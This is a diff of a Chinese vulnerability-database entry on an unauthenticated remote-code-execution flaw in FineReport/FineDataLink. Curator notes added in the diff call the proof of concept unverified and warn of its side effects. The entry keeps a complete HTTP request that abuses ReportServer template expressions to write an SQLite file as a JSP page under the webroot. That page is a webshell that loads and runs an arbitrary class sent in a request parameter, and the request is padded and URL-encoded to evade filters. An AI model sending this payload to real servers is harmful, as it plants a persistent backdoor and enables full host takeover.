@@ -1,12 +1,51 @@
 ---
-version: "**二、网络测绘**"
-
 source: "MrWQ/vulnerability-paper"
+title: "FineReport/FineDataLink ReportServer模板表达式到SQL 注入te写JSP"
+product: "FineReport/FineDataLink"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "声称FineReport V10/V11最新版及FDL≤4.1.10.3；FRDemo SQLite/固定FDL目录"
+prerequisites: "标题匿名，正文称网传未验真"
+side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/iVgNBCx-u3A498tvuJa3_w"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B8%86%E8%BD%AFFineReport/0day%20%E5%B8%86%E8%BD%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%20%E9%99%84%20poc.md"
+id: "vw-1d833a87591d403a29db5637"
+entity_id: "ve-1d833a87591d403a29db5637"
+schema_version: "1"
 ---
 
-# 【0day】帆软未授权命令执行 RCE 附 poc
+# FineReport/FineDataLink ReportServer模板表达式到SQL 注入te写JSP
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：FineReport/FineDataLink；ReportServer模板表达式到SQLite写JSP
+- 版本、配置及部署条件：声称FineReport V10/V11最新版及FDL≤4.1.10.3；FRDemo SQLite/固定FDL目录
+- 认证与权限前提：标题匿名，正文称网传未验真
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 标题0day未授权RCE与网传自行验真冲突，应明确未核实候选
+- version元数据错误是二网络测绘标题，最新版必须换历史构建号/日期
+- 静态解码确认attach/create/insert向/home/FDL/tomcat-linux/...jsp写SQLite文件，依赖FRDemo连接、写权限及JSP解析，不是所有FineReport默认通用
+- 写入JSP调用Unsafe defineAnonymousClass加载请求data的类，持久危险副作用明显，当前无后续data或执行结果
+- 超长test填充/BOM/formfeed作用缺说明；修复链接doc-view-5287html疑缺点，删除sqlite驱动会影响功能须厂商验证
+
+## 操作风险
+
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iVgNBCx-u3A498tvuJa3_w)
 
 **免责声明**  
@@ -41,7 +80,7 @@ app="帆软-FineReport"
 
 网传 poc 自行验真。
 
-```
+```http
 GET /webroot/decision/view/ReportServer?test=ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&n=${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%61%74%74%61%63%68%0C%64%61%74%61%62%61%73%65%20%27%2F%68%6F%6D%65%2F%46%44%4C%2F%74%6F%6D%63%61%74%2D%6C%69%6E%75%78%2F%77%65%62%61%70%70%73%2F%77%65%62%72%6F%6F%74%2F%68%65%6C%70%2F%74%31%36%32%36%35%39%34%2E%6A%73%70%27%20%61%73%20%27%74%31%36%32%36%35%39%34%27%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%63%72%65%61%74%65%0C%74%61%62%6C%65%20%74%31%36%32%36%35%39%34%2E%74%74%28%64%61%74%61%7A%20%74%65%78%74%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%49%4E%53%45%52%54%0C%69%6E%74%6F%20%74%31%36%32%36%35%39%34%2E%74%74%28%64%61%74%61%7A%29%20%56%41%4C%55%45%53%20%28%27%3C%25%43%6C%61%73%73%20%73%61%66%65%20%3D%20%43%6C%61%73%73%2E%66%6F%72%4E%61%6D%65%28%22%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%22%29%3B%6A%61%76%61%2E%6C%61%6E%67%2E%72%65%66%6C%65%63%74%2E%46%69%65%6C%64%20%73%61%66%65%43%6F%6E%20%3D%20%73%61%66%65%2E%67%65%74%44%65%63%6C%61%72%65%64%46%69%65%6C%64%28%22%74%68%65%55%6E%22%20%2B%20%22%73%61%66%65%22%29%3B%73%61%66%65%43%6F%6E%2E%73%65%74%41%63%63%65%73%73%69%62%6C%65%28%74%72%75%65%29%3B%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%20%75%6E%53%61%66%65%20%3D%20%28%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%29%20%73%61%66%65%43%6F%6E%2E%67%65%74%28%6E%75%6C%6C%29%3B%62%79%74%65%5B%5D%20%64%61%74%61%42%79%74%65%73%20%3D%20%6A%61%76%61%78%2E%78%6D%6C%2E%62%69%6E%64%2E%44%61%74%61%74%79%70%65%43%6F%6E%76%65%72%74%65%72%2E%70%61%72%73%65%42%61%73%65%36%34%42%69%6E%61%72%79%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%64%61%74%61%22%29%29%3B%75%6E%53%61%66%65%2E%64%65%66%69%6E%65%41%6E%6F%6E%79%6D%6F%75%73%43%6C%61%73%73%28%6A%61%76%61%2E%69%6F%2E%46%69%6C%65%2E%63%6C%61%73%73%2C%20%64%61%74%61%42%79%74%65%73%2C%20%6E%75%6C%6C%29%2E%6E%65%77%49%6E%73%74%61%6E%63%65%28%29%3B%25%3E%27%29%3B'),1,1)} HTTP/1.1
 host: xxxx
 connection: close
